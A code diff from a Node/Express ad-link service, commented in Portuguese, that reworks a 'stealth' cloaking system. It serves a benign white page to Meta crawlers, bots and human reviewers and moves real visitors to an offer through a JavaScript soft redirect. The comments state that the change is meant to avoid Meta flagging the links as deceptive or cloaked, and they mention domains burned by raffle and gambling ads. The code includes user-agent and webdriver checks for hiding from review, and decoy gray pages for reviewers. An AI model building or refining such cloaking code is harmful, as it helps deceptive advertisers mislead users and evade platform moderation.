@@ -1827,7 +1827,7 @@ app.get('/api/visitors', async (req, res) => {
   else if (filter === 'page_white') where.push("v.stealth_delivery = 'white'");
   else if (filter === 'page_gray') where.push("v.stealth_delivery = 'gray'");
   else if (filter === 'page_offer') where.push("v.stealth_delivery = 'offer'");
-  else if (filter === 'page_redirect') where.push("v.stealth_delivery = 'redirect'");
+  else if (filter === 'page_redirect') where.push("(v.stealth_delivery = 'redirect' OR v.stealth_delivery = 'soft_redirect')");
 
   const deliveryFilter = (req.query.delivery || '').toString().trim().toLowerCase();
   if (deliveryFilter && ['white', 'gray', 'offer', 'redirect'].includes(deliveryFilter)) {
@@ -1908,7 +1908,7 @@ app.get('/api/export', async (req, res) => {
   else if (filter === 'page_white') { sql += " AND v.stealth_delivery = 'white'"; }
   else if (filter === 'page_gray') { sql += " AND v.stealth_delivery = 'gray'"; }
   else if (filter === 'page_offer') { sql += " AND v.stealth_delivery = 'offer'"; }
-  else if (filter === 'page_redirect') { sql += " AND v.stealth_delivery = 'redirect'"; }
+  else if (filter === 'page_redirect') { sql += " AND (v.stealth_delivery = 'redirect' OR v.stealth_delivery = 'soft_redirect')"; }
   sql += ' ORDER BY v.created_at DESC';
 
   const visitors = await db.all(sql, params);
@@ -2353,8 +2353,9 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
-  // Fallback legado (cache): decisão principal no GET pelo servidor — sem delay artificial.
-  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(function(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)location.replace(d.next)}).catch(function(){})}catch(e){}})();</script>`;
+  // GET sempre devolve a mesma white page (HTTP 200). Destino da oferta só via soft-redirect
+  // no cliente após POST — nunca 302 no GET (Meta marca como link enganoso / cloaking).
+  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;function go(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next){try{location.replace(d.next)}catch(e){location.href=d.next}}}fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(go).catch(function(){})}catch(e){}})();</script>`;
 }
 
 async function getUserPageHtml(pageId, userId) {
@@ -2410,13 +2411,22 @@ async function resolveStealthDelivery(site, ctx) {
   if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
     return { kind: 'offer', reason: 'allowed' };
   }
-  return { kind: 'redirect', url: ctx.destWithQs, reason: 'allowed' };
+  // soft_redirect = destino externo via JS (nunca HTTP 302 no GET Stealth)
+  return { kind: 'soft_redirect', url: ctx.destWithQs, reason: 'allowed' };
+}
+
+/** Soft-redirect: HTML da white + JS. Mesmo status 200 / mesmo domínio do link. */
+function buildSoftRedirectHtml(whiteInner, destUrl) {
+  const safeUrl = JSON.stringify(String(destUrl || ''));
+  const script = `<script>(function(){try{var u=${safeUrl};if(!u)return;requestAnimationFrame(function(){setTimeout(function(){try{location.replace(u)}catch(e){location.href=u}},80)})}catch(e){}})();</script>`;
+  return composeStealthHtml(wrapPageHtmlFragment(whiteInner || ''), script);
 }
 
 async function sendStealthDelivery(res, site, delivery, navOpts) {
-  if (delivery.kind === 'redirect') {
-    res.setHeader('Cache-Control', 'no-store, no-cache, private');
-    return res.redirect(302, delivery.url);
+  // Nunca 302 em Stealth — Meta compara crawler (200 white) vs lead (302 oferta) = link enganoso
+  if (delivery.kind === 'redirect' || delivery.kind === 'soft_redirect') {
+    const white = await getStealthBridgeInnerHtml(site);
+    return sendStealthHtmlResponse(res, buildSoftRedirectHtml(white, delivery.url));
   }
   let inner = null;
   if (delivery.kind === 'white') inner = await getStealthBridgeInnerHtml(site);
@@ -2445,6 +2455,7 @@ async function stealthDeliveryToJson(site, ctx, delivery) {
     if (offerHtml) return { inline: true, html: wrapPageHtmlFragment(offerHtml) };
     return { next: ctx.destWithQs };
   }
+  // soft_redirect / redirect legado → só URL via JSON (cliente faz location.replace, sem 302)
   return { next: delivery.url || ctx.destWithQs };
 }
 
@@ -2453,6 +2464,7 @@ function stealthDeliveryLabel(kind) {
     white: 'White page',
     gray: 'Gray page',
     offer: 'Página da oferta (Zero-Redirect)',
+    soft_redirect: 'Soft-redirect — oferta externa (sem 302)',
     redirect: 'Redirect — URL externa da oferta'
   };
   return map[kind] || kind;
@@ -3704,7 +3716,7 @@ function getMetaLinkConfigWarnings(site) {
     } else if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
       warnings.push({ level: 'info', code: 'stealth_zero_redirect', message: 'Zero-Redirect ativo: oferta entregue na mesma URL (página interna), sem salto para outro domínio.' });
     } else {
-      warnings.push({ level: 'medium', code: 'stealth_external_offer', message: 'Oferta em URL externa: após a white page há redirect para outro domínio. Para Meta Ads, prefira "Oferta em Páginas (Zero-Redirect)".' });
+      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta em URL externa via soft-redirect (sem 302 no GET). O HTML inicial é a white page para todos — melhor que 302, mas revisor humano com JS ainda pode chegar na oferta. Domínios queimados por rifa/jogos continuam em risco.' });
     }
     if (!site.gray_page_id) {
       warnings.push({ level: 'low', code: 'no_gray_page', message: 'Sem Gray Page: visitantes bloqueados ficam na white page. Configure uma página cinza (isca) em Páginas para bots e revisores.' });
@@ -3815,9 +3827,17 @@ async function handleStealthLinkGet(req, res, site) {
   const prefix = (req.params.prefix || '').toLowerCase().trim();
   const code = (req.params.code || '').toLowerCase();
   const ctx = await resolveLinkVisitContext(req, site, { skipRefCheck: false });
+  // GET sempre entrega white page — log refletindo o HTML real (não a intenção soft_redirect)
+  if (Array.isArray(ctx.visitorParams) && ctx.visitorParams.length >= 24) {
+    ctx.visitorParams[23] = 'white';
+  }
   void db.run(ctx.visitorSql, ctx.visitorParams).catch((err) => console.error('[visitor] stealth get:', err.message));
-  const delivery = await resolveStealthDelivery(site, ctx);
-  return sendStealthDelivery(res, site, delivery);
+
+  // Ponte unificada: TODOS recebem a mesma white page (HTTP 200) no GET.
+  // Crawler Meta não executa JS → fica na white.
+  // Lead/revisor com JS → POST /api/n/ decide gray / oferta / soft-redirect.
+  // Isso elimina o padrão crawler=200 vs lead=302 (link enganoso).
+  return sendStealthBridgeResponse(res, site, prefix, code, { includeNavScript: true });
 }
 
 // Handler compartilhado para links (/:prefix/:code)
